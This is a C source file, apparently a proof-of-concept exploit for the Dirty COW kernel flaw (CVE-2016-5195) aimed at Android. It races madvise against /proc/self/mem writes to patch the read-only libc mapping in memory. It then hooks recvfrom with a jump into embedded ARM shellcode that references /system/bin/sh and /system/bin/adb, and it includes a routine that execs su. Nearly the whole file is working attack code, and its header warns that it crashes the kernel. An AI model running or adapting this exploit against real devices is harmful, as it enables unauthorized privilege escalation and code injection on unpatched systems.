/*
 * CVE-2016-5195 dirtypoc
 *
 * This PoC is memory only and doesn't write anything on the filesystem.
 * /!\ Beware, it triggers a kernel crash a few minutes.
 *
 * gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
 */

#define _GNU_SOURCE
#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <elf.h>


#define SHELLCODE	 "\x07\xc0\xa0\xe1\xc7\x70\xa0\xe3\x00\x00\x00\xef\x0c\x70\xa0\xe1\x00\x00\x50\xe3\x01\x00\x00\x0a\x01\x0a\x70\xe3\x1e\xff\x2f\x91\xff\x40\x2d\xe9\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\x01\x1c\x14\x31\x1c\x0a\x0b\x27\x00\xdf\xff\xbd\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x73\x68\x00"
#define SPACE_SIZE	256
#define LIBC_PATH	"/system/lib/libc.so"
#define LOOP		0x1000000
#define SHELLCODE_LOCATION 0x1d0
#define SHELLCODE_PC_LOCATION 0x3e


#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif


struct mem_arg  {
	struct stat st;
	off_t offset;
	unsigned int patch_addr;
	unsigned char *patch;
	unsigned char *check;
	size_t patch_size;
	void *map;
};


static int check(struct mem_arg * mem_arg)
{
	return memcmp(mem_arg->patch, mem_arg->check, mem_arg->patch_size) == 0;
}


static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i;

	mem_arg = (struct mem_arg *)arg;
	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
	size = mem_arg->offset - (unsigned long)addr;

	for( i = 0; i < LOOP; i++) {
		madvise(addr, size, MADV_DONTNEED);

		if (i % 0x1000 == 0 && check(mem_arg))
			break;
	}

	return NULL;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->patch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		err(1, "open(\"/proc/self/mem\"");

	for ( i = 0; i < LOOP; i++) {
		lseek(fd, mem_arg->offset, SEEK_SET);
		write(fd, p, mem_arg->patch_size);

		if (i % 0x1000 == 0 && check(mem_arg))
			break;
	}

	close(fd);

	return NULL;
}

static int get_range(unsigned int *start, unsigned int *end)
{
	char line[4096];
	char filename[PATH_MAX];
	char flags[32];
	FILE *fp;
	int ret;

	ret = -1;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL)
		err(1, "fopen(\"/proc/self/maps\")");

	while (fgets(line, sizeof(line), fp) != NULL) {
		//printf("%s", line);
		sscanf(line, "%x-%x %s %*x %*x:%*x %*Lu %s", start, end, flags, filename);

		if (strstr(flags, "r-xp") == NULL)
			continue;

		if (strstr(filename, "/libc.so") == NULL)
			continue;
		//printf("[%lx-%6lx][%s][%s]\n", start, end, flags, filename);
		ret = 0;
		break;
	}

	fclose(fp);

	return ret;
}

static void getroot(void)
{
	execlp("su", "su", NULL);
	err(1, "failed to execute \"su\"");
}

static void exploit(struct mem_arg *mem_arg)
{
	pthread_t pth1, pth2;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
}

void * get_func_addr(char * func)
{
	void * addr;
	void * handle;
	char * error;

	dlerror();

	handle = dlopen("libc.so", RTLD_LAZY);
	if (handle == NULL) {
		fprintf(stderr, "%s\n", dlerror());
		exit(EXIT_FAILURE);
	}

	addr = dlsym(handle, func);
	error = dlerror();
	if (error != NULL) {
		fprintf(stderr, "%s\n", error);
		exit(EXIT_FAILURE);
	}

	dlclose(handle);

	return addr;
}

void patch(void * addr, char * payload, size_t payload_len) {
	unsigned int start, end;
	void * func_addr;
	struct mem_arg mem_arg;
	struct stat st;
	pid_t pid;
	int fd, pagenum;
	char opcode[8];
	
	if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	printf("[*] range: [%x-%x]\n", start, end);

	mem_arg.patch = malloc(payload_len);
	if (mem_arg.patch == NULL)
		err(1, "malloc");

	mem_arg.check = addr;
	
	memcpy(mem_arg.patch, payload, payload_len);
	mem_arg.patch_size = payload_len;

	fd = open(LIBC_PATH, O_RDONLY);
	if (fd == -1)
		err(1, "open(\"" LIBC_PATH "\")");
	if (fstat(fd, &st) == -1)
		err(1, "fstat");

	mem_arg.map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem_arg.map == MAP_FAILED)
		err(1, "mmap");
	close(fd);

	printf("[*] mmap %p\n", mem_arg.map);

	mem_arg.st = st;
	mem_arg.offset = (off_t)((unsigned int)mem_arg.map + addr - start);

	exploit(&mem_arg);

	printf("[*] patch complete\n\n");
}


int plt_offset() {

    struct stat st;  

    char buffer[32];

    FILE* fp;  
	Elf32_Ehdr ehdr;  
	Elf32_Shdr* shdrs;

    if (stat(LIBC_PATH, &st) < 0) {  
        printf("size erro.\n");  
        return 0;  
    } else {  
        //printf("File size is:%ld\n", (unsigned long) st.st_size);  
    }  
  
    fp = fopen(LIBC_PATH, "rb");  
    if (fp == NULL) {  
        printf("Open failed.\n");  
    } else {  
    
	    //read ehdr
	    fseek(fp, 0, SEEK_SET);  
	    fread(&ehdr, sizeof(Elf32_Ehdr), 1, fp);  

	   	//read shdrs	

	    shdrs = malloc(ehdr.e_shnum * sizeof(Elf32_Shdr));

	   	int i, offset = 0;
	    for ( i = 0; i < ehdr.e_shnum; i++) {
	    	fseek(fp, ehdr.e_shoff+offset, SEEK_SET );  
    		fread(&shdrs[i], sizeof(Elf32_Shdr), 1, fp); 
    		offset+=ehdr.e_shentsize;
    	}

    	offset = 0;
    	if(ehdr.e_shstrndx!=SHN_UNDEF) { 

    		for ( i = 0; i < ehdr.e_shnum; i++ ) {
	    	 
				long int table=shdrs[ehdr.e_shstrndx].sh_offset;  
	    		fseek(fp,table+shdrs[i].sh_name,SEEK_SET);  
	    		fread(buffer,32,1,fp);

	            if(0==strcmp(buffer, ".plt")){
					printf("sh_offset: %04X\n", shdrs[i].sh_offset);
					offset = shdrs[i].sh_offset;
					break;
				}   
			}
			
		} 
		free(shdrs);
	    fclose(fp);
	    return offset; 
    }  
}

int got_memoffset(int* entry_num)
{

 	struct stat st;  

    char buffer[32];

    FILE* fp;
	Elf32_Ehdr ehdr;
	Elf32_Shdr* shdrs;

    if (stat(LIBC_PATH, &st) < 0) {  
        printf("size erro.\n");  
        return 0;  
    } else {  
       // printf("File size is:%ld\n", (unsigned long) st.st_size);  
    }  
  
    fp = fopen(LIBC_PATH, "rb");  
    if (fp == NULL) {  
        printf("Open failed.\n");  
    } else {  
    
	    //read ehdr
	    fseek(fp, 0, SEEK_SET);  
	    fread(&ehdr, sizeof(Elf32_Ehdr), 1, fp);  

	   	//read shdrs	
	    //printf("section num %d, section hdr size %d.\n", ehdr.e_shnum, ehdr.e_shentsize);
	    shdrs = malloc(ehdr.e_shnum * ehdr.e_shentsize);

	   	int i, offset = 0;
	    for ( i = 0; i < ehdr.e_shnum; i++) {
	    	fseek(fp, ehdr.e_shoff+offset, SEEK_SET );  
    		fread(&shdrs[i], ehdr.e_shentsize, 1, fp); 
    		//printf("[*] section header offset %08lx, section offset %08lx \n",ehdr.e_shoff+offset, shdrs[i].sh_offset);
    		offset+=ehdr.e_shentsize;
    	}

    	offset = 0;
    	long int table=shdrs[ehdr.e_shstrndx].sh_offset;
    	//printf("[*] string table @ section[%d] %08lx\n", ehdr.e_shstrndx, table);
    	if(ehdr.e_shstrndx!=SHN_UNDEF) {
    		for ( i = 0; i < ehdr.e_shnum; i++ ) {
		    	fseek(fp,table+shdrs[i].sh_name,SEEK_SET);  
		    	fread(buffer,32,1,fp);
		    	//printf("%s : %04X\n", buffer, shdrs[i].sh_addr);

		        if(0==strcmp(buffer, ".got")){
					//printf(".got: %04X\n", buffer, shdrs[i].sh_addr);
					offset = shdrs[i].sh_addr;
					*entry_num = shdrs[i].sh_size/4;
					break;
				}
    		}
		}
		free(shdrs);
	    fclose(fp);
	    return offset; 
    }  
}

int main(int argc, char *argv[])
{
	unsigned start, end;
	int i;

	char SC[] = "\xff\x40\x2d\xe9"
				"\x07\xc0\xa0\xe1"
				"\xc7\x70\xa0\xe3"
				"\x00\x00\x00\xef"
				"\x0c\x70\xa0\xe1"
				"\x00\x00\x50\xe3"
				"\x01\x00\x00\x0a"
				"\xff\x40\xbd\xe8"
				"\x0a\x00\x00\xea"
				//dlopen
				"\x0f\x00\xa0\xe1"
				"\x4c\x00\x80\xe2"
				"\x00\x10\xa0\xe3"
				"\x03\x30\x43\xe0"
				"\x0f\x30\x83\xe0"
				"\x4c\x30\x83\xe2"
				"\x00\x30\x93\xe5"
				"\x03\x30\x8f\xe0"
				"\x00\x30\x93\xe5"
				"\x33\xff\x2f\xe1"
				"\xff\x40\xbd\xe8"
				//org_fun
				"\x0d\xc0\xa0\xe1"
				"\xf0\x00\x2d\xe9"
				"\x70\x00\x9c\xe8"
				"\x49\x7f\xa0\xe3"
				"\x00\x00\x00\xef"
				"\xf0\x00\xbd\xe8"
				"\x01\x0a\x70\xe3"
				"\x1e\xff\x2f\x91"
				"\x00\x00\x60\xe2"
				"\x00\x00\x00\xea"
                "\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x61\x64\x62\x00\x00\x00\x00\x00";
 
	//sleep(30);
	
    if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	int vaddr_dlopen   = get_func_addr("dlopen");
	printf("[*] dlopen vitual addr: %08lx\n", vaddr_dlopen);

	int got_entrynum= 0;
	int got_addr_off = got_memoffset(&got_entrynum);
	int got_addr = start + got_addr_off;

	printf("[*] got_addr vitual addr: %08lx, num : %d\n", got_addr, got_entrynum);

	for(i = 0; i < got_entrynum; i++){
		if ( ((int*)got_addr)[i] == vaddr_dlopen ){
			printf("[*] dlopen @ got %d\n", i);
			break;
		}
	}


	int dlopen_offset = got_addr_off + i * 4;
	char* vaddr_dlopen_got = start + dlopen_offset;
	char* vaddr_recvfrom   = get_func_addr("recvfrom");
	int   vaddr_payload = (void*)(end - 0x90);

	//get addr of set_errno
	int set_errno_offset = 0, vaddr_set_errno = 0;
	for( i = 0; i < 256; i++) {
		if( vaddr_recvfrom[i] == 0xea) {
			printf("[*] b* %08lx\n", (int)&vaddr_recvfrom[i-3]);
			vaddr_set_errno = (int)&vaddr_recvfrom[i-3] + 8 + (*(int*)&vaddr_recvfrom[i-3] & 0x00ffffff) * 4;
			break;
		}
	}

	printf("[*]pid: %d, recv_from: %08lx, vaddr_set_errno: %08lx, vaddr_dlopen_plt: %08lx, vaddr_payload: %08lx\n", 
		getpid(), vaddr_recvfrom, vaddr_set_errno, vaddr_dlopen_got, vaddr_payload);


    dlopen_offset = vaddr_dlopen_got - vaddr_payload - 0x48 ;
    set_errno_offset = vaddr_set_errno - (vaddr_payload + 0x74 + 8);//8074:	eafffff5 	b	8050 <org_fun>

    *(int*)&SC[0x74] = set_errno_offset/4;//8074:	eafffff5 	b	8050 <org_fun>
    *(char*)&SC[0x77] = 0xea;//8074:	eafffff5 	b	8050 <org_fun>
    *(int*)&SC[0x88] = dlopen_offset;
    printf("dlopen_offset = %08lx", dlopen_offset);
    patch(vaddr_payload, SC, 0x90);

    
    char JMP[] = "\x04\xc0\x9f\xe5\x0c\xc0\x8f\xe0\x1c\xff\x2f\xe1\x00\x00\x00\x00";
    int offset = (int)vaddr_payload-(int)vaddr_recvfrom;
    printf("vaddr_payload %08lx, offset %08lx\n", vaddr_payload, offset);
    *(int*)&JMP[12] = offset-12;
    patch(vaddr_recvfrom, JMP, 16);           
    exit(0);

    void * addr;
  	addr = (void *)((int)vaddr_recvfrom & (~(PAGE_SIZE - 1)));
    mprotect (addr, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
 	memcpy(vaddr_recvfrom, JMP, 16);
	printf("getuid() = %d\n", recvfrom(0,0,0,0,0,0));


	exit(0);
}
